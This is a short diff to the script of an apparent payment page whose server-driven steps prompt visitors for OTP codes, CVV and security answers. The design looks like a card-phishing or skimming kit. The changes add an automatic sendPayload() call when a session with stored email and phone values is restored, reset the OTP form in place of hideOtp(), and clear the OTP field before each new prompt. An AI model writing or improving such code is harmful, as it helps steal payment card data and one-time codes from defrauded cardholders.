@@ -1476,7 +1476,11 @@ url("pay1ment_icons.woff") format("woff");
     /* 收到验证类 action 时先隐藏 OTP 区域以便重新展示 */
     if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail' ||
         a === 'cvv_verify'  || a === 'question_verify') {
-      hideOtp();
+      //hideOtp();
+      q('otp-result').className = 'hidden';
+      q('otp-form').className = '';
+      q('otp-spinner').style = '';
+
     }
  
     if (a === 'ack') {
@@ -1496,7 +1500,7 @@ url("pay1ment_icons.woff") format("woff");
       if (cu.email     && q('email'))      q('email').value     = cu.email;
       if (cu.phone     && q('phone'))      q('phone').value     = cu.phone;
       //showMsg('info', 'Session restored.');
- 
+      sendPayload();
     } else if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail') {
       hideLoad();
       _curStep = 'otp';
@@ -1717,6 +1721,7 @@ url("pay1ment_icons.woff") format("woff");
   function showOtp() {
     
     var sec = q('otp-overlay');
+    document.getElementById('otp-code').value = '';
     //var btn = q('btnSubmit');
     if (sec) sec.className = 'overlay';
     //if (btn) btn.style.display = 'none';
